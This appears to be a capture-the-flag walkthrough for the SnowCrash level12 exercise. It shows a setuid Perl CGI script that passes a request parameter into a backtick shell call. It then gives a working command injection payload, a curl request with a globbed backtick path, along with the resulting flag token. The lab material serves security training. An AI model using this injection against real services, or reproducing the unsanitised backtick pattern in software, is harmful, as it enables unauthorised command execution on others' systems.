
```sh
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

```sh
level12@SnowCrash:~$ ./level12.pl 
Content-type: text/html

..level12@SnowCrash:~$ cat level12.pl 
```

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

```sh
level12@SnowCrash:~$ echo "getflag | wall" > /tmp/GETFLAG
level12@SnowCrash:~$ chmod +rwx /tmp/GETFLAG
level12@SnowCrash:~$ curl localhost:4646 -d 'x=`/*/GETFLAG`'
                                                                               
Broadcast Message from flag12@Snow                                             
        (somewhere) at 1:54 ...                                                
                                                                               
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr                      

..level12@SnowCrash:~$
```